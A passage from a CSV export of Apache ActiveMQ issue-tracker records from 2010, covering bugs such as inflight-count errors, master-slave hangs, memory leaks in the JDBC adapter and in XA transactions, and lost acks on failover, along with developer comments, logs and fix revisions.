If not, when can I expect a snapshot release which includes the fix?;;;","27/Jan/10 18:39;gtully;most of the artifacts are there but the release full tar or zip files still have not been updated for the 5.4-SNAPSHOT - need to check why hudson has not done it, it may be pending a full clean build. Some test failures were resolved today so it should be real soon.;;;","28/Jan/10 08:24;kutzi;Seems like the MD5 and SHA signatures are redeployed every day, but the artifacts themselves (JARs, POMs) are still from January 15th;;;","28/Jan/10 10:20;gtully;I kicked hudson into doing a redeploy of the artifacts and the full install tar files are now uploaded containing the build artifacts from the 27/01 which should have the fix for this issue.
;;;","28/Jan/10 10:32;kutzi;Thanks.
Seems like new artifacts were only deployed for ActiveMQ 5.4.
Can you also do it for 5.3.1-SNAPSHOT, please?;;;","28/Jan/10 10:49;gtully;done for 5.3.1-SNAPSHOT;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Rollback redelivery causes inflight count to get out of sync,AMQ-2566,12483191,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,13/Jan/10 13:08,18/Jan/10 13:22,14/Jul/23 05:43,13/Jan/10 15:20,5.3.0,,,,,5.3.1,5.4.0,,Broker,,,,0,,,,,,,,,"A negative inflight count can result from rollback redelivery as each rollback decremented the inflight count
With a 0 maxRedeliveryAttempts policy, the poisonAck was incrementing inflight.

poisinAck should manage the inflight as they are still present (inflight) in the consumer till they are acked via commit or a poisonAck.

adding some asserts to the existing DeadLetterTest junit demonstrates the problem.",any,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74891,,,Mon Jan 18 13:22:24 UTC 2010,,,,,,,,,,,"0|i0rqdr:",159918,,,,,,,,,,,,,,,,,,,,,"13/Jan/10 15:20;gtully;resolved in r898797;;;","18/Jan/10 13:22;gtully;fix merged to 5.3.1 branch at r900391;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Pure Master Slave broker hangs when storage limit is reached,AMQ-2564,12483260,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,joern,joern,12/Jan/10 14:32,25/May/10 12:04,14/Jul/23 05:43,21/May/10 11:43,5.3.0,,,,,5.4.0,,,Broker,,,,1,,,,,,,,,"The pure master slave broker hangs when the storage limit is reached and dequeueing messages from the queue is not possible.

The behavior can be reproduced with a producer which sends messages to the master broker until the slave broker writes
 ""INFO | Usage Manager Store is Full. Stopping producer (ID:karkand-51292-1263305705067-0:0:1:1) to prevent flooding queue://TestQueue. See http://activemq.apache.org/producer-flow-control.html for more info""
this message to the console.
To reproduce the store is full message on the slave broker maybe 2 - 3 attempts are necessary otherwise
the messages appears on the console of the master broker.

Any attempts by a test consumer to dequeue messages fail, it just hangs.

The following information gather with JMX might be interesting:
MASTER: StorePercentUsage=99
SLAVE:    StorePercentUsage=100

The attributes for the Queue are identical on both 
brokers.","Ubuntu 9.10 Desktop, Java 1.6 (build 1.6.0_16-b01)",zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Jan/10 14:35;joern;activemq-master.xml;https://issues.apache.org/jira/secure/attachment/12461591/activemq-master.xml","12/Jan/10 14:35;joern;activemq-slave.xml;https://issues.apache.org/jira/secure/attachment/12461592/activemq-slave.xml",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74892,,,Tue May 25 12:04:03 UTC 2010,,,,,,,,,,,"0|i0jxg7:",114349,,,,,,,,,,,,,,,,,,,,,"12/Jan/10 16:21;gtully;can you validate that this is still a problem with a current 5.4-SNAPSHOT? There was one deadlock issue resolve in the past few weeks in the context of being full and not resuming leading to hung consumers. this was not related to pure master slave however but it may be the difference.;;;","12/Jan/10 16:51;joern;I repeated the test with the apache-activemq-5.4-SNAPSHOT build from Wed Jan 06 15:02:31 GMT+00:00 2010 (http time stamp on the download site).
The result was the same as described above.

After stopping the slave broker it was possible to dequeue messages again from the master broker.

The 5.4-SNAPSHOT version prints out more information to the console:
 INFO | ActiveMQ JMS Message Broker (slave, ID:karkand-43612-1263314151269-1:0) started
 INFO | Usage Manager Store is Full. Producer (ID:karkand-58702-1263314161468-0:0:1:1) stopped to prevent flooding queue://TestQueue. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 30s)
 INFO | Usage Manager Store is Full. Producer (ID:karkand-58702-1263314161468-0:0:1:1) stopped to prevent flooding queue://TestQueue. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 60s)
 INFO | Usage Manager Store is Full. Producer (ID:karkand-58702-1263314161468-0:0:1:1) stopped to prevent flooding queue://TestQueue. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 90s)
 INFO | Usage Manager Store is Full. Producer (ID:karkand-58702-1263314161468-0:0:1:1) stopped to prevent flooding queue://TestQueue. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 121s)
 INFO | Usage Manager Store is Full. Producer (ID:karkand-58702-1263314161468-0:0:1:1) stopped to prevent flooding queue://TestQueue. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 151s)
 INFO | Usage Manager Store is Full. Producer (ID:karkand-58702-1263314161468-0:0:1:1) stopped to prevent flooding queue://TestQueue. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 182s)
 INFO | Usage Manager Store is Full. Producer (ID:karkand-58702-1263314161468-0:0:1:1) stopped to prevent flooding queue://TestQueue. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 212s)
 INFO | Usage Manager Store is Full. Producer (ID:karkand-58702-1263314161468-0:0:1:1) stopped to prevent flooding queue://TestQueue. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 242s)
 INFO | Usage Manager Store is Full. Producer (ID:karkand-58702-1263314161468-0:0:1:1) stopped to prevent flooding queue://TestQueue. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 272s)
 INFO | Usage Manager Store is Full. Producer (ID:karkand-58702-1263314161468-0:0:1:1) stopped to prevent flooding queue://TestQueue. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 303s)
 INFO | Usage Manager Store is Full. Producer (ID:karkand-58702-1263314161468-0:0:1:1) stopped to prevent flooding queue://TestQueue. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 333s)
 INFO | Usage Manager Store is Full. Producer (ID:karkand-58702-1263314161468-0:0:1:1) stopped to prevent flooding queue://TestQueue. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 363s)

The producer was directly connected to the master broker and not the slave broker. These messages must be about a connection between the master and slave broker.;;;","12/Jan/10 17:09;joern;I added the  sendFailIfNoSpace=""true"" attribute to the systemUsage element of he slave broker config, repeated the test and the following exception was printed to the console of the master broker:

ERROR | Slave Failed
javax.jms.ResourceAllocationException: Usage Manager Store is Full. Producer (ID:karkand-45529-1263315817291-0:0:1:1) stopped to prevent flooding queue://TestQueue. See http://activemq.apache.org/producer-flow-control.html for more info
	at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:500)
	at org.apache.activemq.broker.region.Queue.send(Queue.java:474)
	at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:354)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:445)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:224)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:126)
	at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:95)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:133)
	at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:443)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:631)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:297)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:175)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
	at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:207)
	at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)
	at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36);;;","21/May/10 11:43;gtully;r 946974 should resolve this. One thing to note is to ensure that the usage limits on the slave are a little higher than the master such that flow control happens only on the master, other wise replication can block which can block message consumption.

the revision provides a test and  resolves a hang situation where the producer missed a reply because the replication messed with the correlation id. Normally the ids are in sync, but when a message is queued waiting for space, they can be mismatched. having the replicator (MasterBroker filter) copy the underlying message resolved this issue,;;;","25/May/10 11:49;joern;Finding the right higher value on the slave seems to be tricky, since it depends on the message size which is usually dynamic,
which means that depending on the configuration the broker could work for quite some time and then fail suddenly when a bunch of bigger messages is received (which might happen, depending on the application).

Users which choose a PureMasterSlave configurtion are really focused on stability.
For this particular issue the slave should maybe disable the flow control completely when the master is healthy, 
what do you think Gary ?;;;","25/May/10 12:04;gtully;Agree, this is not ideal, but it is not just flow control, it is any memory limit because the default behavior is to block a send if the memory limit is reached. So the slave should be configured with large memory limits or left unbounded.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Memory Leak in DefaultJDBCAdapter,AMQ-2563,12483189,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,jimharter,jimharter,08/Jan/10 20:52,03/Feb/10 14:46,14/Jul/23 05:43,03/Feb/10 14:46,5.3.0,,,,,5.3.1,5.4.0,,Message Store,,,,1,,,,,,,,,"I was performing an endurance test on ActiveMQ 5.3.0.  My test consisted of a single queue with a number of producers and consumers.  The producers send very simple text messages and the consumers simply receive the message and do no other processing.  Using the OOTB configuration (which uses -Xmx512m) with JDBC persistence to an Oracle database, I found the system came to a halt at around 10.3 million messages.  Looking at the VM revealed a very full heap and tiny gains from garbage collection.  Restarting the broker allows the system to run again.

To determine the cause of the exhausted heap, I took a series of heap dumps over time.  My examination of the heaps showed that the number of live instances of TreeMap$Entry and Long were increasing linearly with the number of messages.  The Longs were owned by the TreeMap$Entry objects.  The TreeMap$Entry objects could be tracked back to the TreeSet<Long> instance from the lastRecoveredMessageIds field in DefaultJDBCAdapter.

The only method that uses lastRecoveredMessageIds is:
public void doRecoverNextMessages(TransactionContext c, ActiveMQDestination destination, long nextSeq,
            int maxReturned, JDBCMessageRecoveryListener listener) throws Exception

As the listener is called to recover a message, the id is added to this set.  The id is only removed from this set if it is encountered on future run of doRecoverNextMessages when it is added to the cleanupIds list.  The SQL that is executed at the beginning of the method filters messages based on having an id greater than nextSeq.  If nextSeq is always large enough, an id is never added to cleanupIds and consequently never removed from lastRecoveredMessageIds.

I saw that the use of lastRecoveredMessageIds was introduced with AMQ-1918.  Also, AMQ-2436 synchronizes the TreeSet, but that should have no effect on this issue.

Dejan mentioned some work done on JDBC persistence and a memory leak fix in association with AMQ-2519.  I have performed the same test on the latest snapshots of 5.3.1 and 5.4.  The same results were observed on those as well.  Also, work done for AMQ-2519 modified JDBCMessageStore, JDBCTopicMessageStore, and JDBCPersistenceAdapter.  I believe the issue is in DefaultJDBCAdapter.

To reproduce:
- Start a broker using JDBC persistence (sample configuration file will be attached)
- Start a number of producers and consumers using the same queue on that broker (sample WAR file will be attached.  Modify WEB-INF/applicationContext.xml to set the queue name and broker URL.  The war file currently uses TestQueue and tcp://localhost:61616, respectively.)
- Wait for about 20,000 messages to be processed (you can use less; it just gets easier in the heap dumps to see after about 20,000 messages.  29 bytes are retained per message that is processed)
- Look at the old generation size after a full garbage collection over time.  It grows slowly.
- Obtain a heap dump.  The heap dump will show a number of retained instances of TreeMap$Entry and Long.  (sample heap dump will be attached)",Java 1.6.0_07-b06 on Solaris (5.10) sparcv9,jimharter,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Jan/10 20:55;jimharter;AMQTest.war;https://issues.apache.org/jira/secure/attachment/12461588/AMQTest.war","08/Jan/10 20:55;jimharter;heap.zip;https://issues.apache.org/jira/secure/attachment/12461587/heap.zip","08/Jan/10 20:55;jimharter;jdbc-test.xml;https://issues.apache.org/jira/secure/attachment/12461586/jdbc-test.xml",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74893,,,Wed Feb 03 14:46:58 UTC 2010,,,,,,,,,,,"0|i0rpw7:",159839,,,,,,,,,,,,,,,,,,,,,"08/Jan/10 20:55;jimharter;Attaching sample broker configuration file, test web application to produce and consume messages, and a zip of a heap dump showing the memory leak;;;","10/Jan/10 11:25;dejanb;Scheduled it for 5.3.1;;;","03/Feb/10 14:46;dejanb;Resolved with svn revision 906054.

The problematic lastRecoveredMessageIds is removed completely. It was just a temp workaround for duplicate messages. Now we have it implemented when messages are added to the store, so there's no need for this check.

The commit also includes a fix for a cursor problem spotted during the test.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failover reconnect with outstanding consumer transaction can result in javax.jms.JMSException: Unmatched acknowledege: MessageAck and lost ack,AMQ-2560,12483215,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,08/Jan/10 00:07,18/Jan/10 13:19,14/Jul/23 05:43,18/Jan/10 13:19,5.3.0,,,,,5.3.1,5.4.0,,Broker,,,,0,,,,,,,,,"It is possible to loose an ack after failover if an outstanding consumer transaction (and ack) is in progress during failover. If due to ordering or timing, an unexpected message is replayed to the consumer on recovery it will delivered (and correctly not suppressed as a duplicate). This will be acked with the outstanding messages but the ack will result in an exception {code}javax.jms.JMSException: Unmatched acknowledege: MessageAck...{code} as the original message will not have been re-dispatched. Essentially the ack is lost at this stage.
The message will stay dispatched/inflight til the consumer closes, at which point it can again be re-dispatched to another consumer. A broker restart will also see it re-dispatched. In the mean time, it can look orphaned for some time or will be visible in the jdbc store. It will also be visible via the inflight count on that consumer.

Resolution:
On a transport disconnect, a consumer should discard acked state along with delivered messages as the messages that are redelivered are not guaranteed to be the same. This was not being done for a transacted session. Replayed messages are more likely to be the same if the order of connection recovery is preserved, but this will not be sufficient. (the test case shows the problem because recovery order is dependent on hashmap order which is random when dealing with connection ids)
This needs to be done for both consumers that use receive() or message listeners (that are handled through dispatch)",,xbhanu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74895,,,Mon Jan 18 13:19:56 UTC 2010,,,,,,,,,,,"0|i0rqf3:",159924,,,,,,,,,,,,,,,,,,,,,"18/Jan/10 13:19;gtully;changed merged to 5.3.1 branch at r900390;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Message Broker Hangs When Temp Store Fills,AMQ-2557,12483178,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,joef,joef,04/Jan/10 15:24,05/Jan/10 15:00,14/Jul/23 05:43,05/Jan/10 12:47,5.3.0,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"This is an exception test with the following set up. 

ProducerTool sends 200000 non-persistent messages to a Topic with the message size = 2000. 

The ConsumerTool that reads the messages from the Topic has a sleep time of 2 msec, thus creating a slow consumer scenario.   

Temp store = 300mb, Topic memoryLimit = 30mb, producerFlowControl = false. 

The consumer begins to receive messages and messages get written out to the temp store as expected, because the slow consumer cannot keep up with the message load and temp topic fills up. However, when the temp store eventually fills as well, the broker goes comatose. It no longer accepts clients connections and stops dispatching messages to the slow consumer.  You'd expect the broker to at least continue dispatching messages to the slow consumer while the producer is blocked awaiting the temp store to free up. If I double the temp store capacity, everyone is a happy camper. I'll attach a thread dump.



","AMQ 5.3, Open Suse 11.0, JVM 1.6.0_14-b08, KahaDB, default store cursor, temp storage set to 300mb.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Jan/10 15:26;joef;amq.out;https://issues.apache.org/jira/secure/attachment/12461580/amq.out",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74896,,,Tue Jan 05 15:00:36 UTC 2010,,,,,,,,,,,"0|i0rqdj:",159917,Regression,,,,,,,,,,,,,,,,,,,,"05/Jan/10 11:54;gtully;Joe, does the test fail with trunk? Think this may be a duplicate of https://issues.apache.org/activemq/browse/AMQ-2475;;;","05/Jan/10 12:45;joef;Gary, yep it does appear to be a duplicate of 2475 and the latest 5.4 SNAPSHOT works fine; however, the problem still exists with the latest (Dec 24) 5.3.1 SNAPSHOT.  Will it be applied to the next 5.3.1 SNAPSHOT? Or are  folks being advised to move from 5.3 to 5.4? Thanks, Joe;;;","05/Jan/10 12:47;joef;Duplicate of AMQ-2475; however, 5.3.1 doesn't appear to have the fix;;;","05/Jan/10 15:00;gtully;rob just merged that fix to the 5.3 branch r896063 so it will be in tonight's snapshot.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Memory leaks with XA Transactions (case of read-only transactions),AMQ-2556,12483514,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,daniel.santos,daniel.santos,04/Jan/10 14:01,09/Sep/10 12:27,14/Jul/23 05:43,01/Apr/10 23:27,5.1.0,5.2.0,5.3.0,,,5.4.0,,,Broker,JMS client,,,1,,,,,,,,,"Some transaction related information are not released in case of read-only transactions (where not messages have been consumed or produced) by broker and client, that causes an OutOfMemory after running some time.

Fields that hold these ""transaction related information"" are (at least) :
- {{org.apache.activemq.state.ConnectionState.transactions}}
- {{org.apache.activemq.TransactionContext.ENDED_XA_TRANSACTION_CONTEXTS}}

After serach, it seems that the case of read-only XA transactions (that terminates at prepare time) has been missed in some code like :
- {{org.apache.activemq.broker.TransportConnection}} that puts TransactionState in {{org.apache.activemq.state.ConnectionState.transactions}} at the beginning, release them at commit (or rollback) time *but not at prepare time where result is {{XAResource.XA_RDONLY}}*
- {{org.apache.activemq.TransactionContext}} that do the same mistake via ENDED_XA_TRANSACTION_CONTEXTS in prepare()

_Note that the case of read-only transactions seems correctly done by {{org.apache.activemq.transaction.XATransaction}} (very interesting comment here http://fisheye6.atlassian.com/browse/activemq/trunk/activemq-core/src/main/java/org/apache/activemq/transaction/XATransaction.java?r=809940#l175)_
","ActiveMQ 5.3.0
Atomikos Transactions Essentials 3.5.8
Spring 2.5.6
Oracle 11g (thin driver version 11.1.0.7.0)
",tkrah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Jan/10 14:20;daniel.santos;XAConsumer.zip;https://issues.apache.org/jira/secure/attachment/12461579/XAConsumer.zip",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14817,,,Thu Sep 09 12:27:35 UTC 2010,,,,,,,,,,,"0|i0ba6n:",63762,,,,,,,,,,,,,,,,,,,,,"04/Jan/10 14:20;daniel.santos;TO REPRODUCE :
1- Launch a broker
2- Launch this ready to use app (consumer in a XA transaction, implemented as a Spring's MessageListenner. The config is taken from atomikos http://www.atomikos.com/Documentation/SpringIntegration)

No producer nor another XAResource is needed to show the problem

Simply use a debugger, (j)visualvm, jmap/jhat or another memory profiler tool to see grow up indefinitly (at each receiveTimeout unit of time : 3s) the number of TransactionContext instances on client and TransactionState instances on broker;;;","31/Mar/10 12:42;tkrah;5.3.1 is still affected.
Using Spring 3.0.1, Atomikos 3.6.0 and Springs Message Listener i can see this too. 
The ActiveMQXASession and ActiveMQTopicSubscriber Instances are growing also until OOM.

Looking the ActiveMQMessageConsumer in calls to close this is done:

new Synchronization() {
                    public void afterCommit() throws Exception {
                        doClose();
                    }

                    public void afterRollback() throws Exception {
                        doClose();
                    }
                });

But what about not being commited or rollbacked at all in case of XA_RDONLY - doClose will never be called - don't know if this does matter for this memory leak but it seems inconsistent that resource cleanup is only done fpr commit + rollback.
;;;","01/Apr/10 23:27;gtully;thanks for the great test case, issue resolved on trunk in r930135
state on the client, broker and failover transport needed to be reclaimed on prepare readonly.;;;","19/May/10 09:26;mcarpella;Is the fix-version 5.4.0 correct, i.e. fix is not included in 5.3.2?;;;","19/May/10 10:09;gtully;afraid so, 5.4 will be out by the end of the summer. It was rolled into a [fuse release|http://repo.fusesource.com/maven2/org/apache/activemq/apache-activemq/5.3.1-fuse-01-00/] so u can get it there in the mean time, if a 5.4-SNAPSHOT does not work for you. ;;;","27/May/10 13:23;mlayer;Even with the fix (r930135), is it not still possible that {{TransactionContexts}} remain indefinitely in {{TransactionContext.ENDED_XA_TRANSACTION_CONTEXTS}}? {{syncSendPacketWithInterruptionHandling}} could throw a {{JMSException}} before the context is removed from the Map, if I am not mistaken.;;;","09/Sep/10 12:27;gtully;marc, think r995397 will resolve the possibility of dangling refs in ENDED_XA_TRANSACTION_CONTEXTS if prepare fails with an exception and rollback is not subsequently called, as it need not be.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
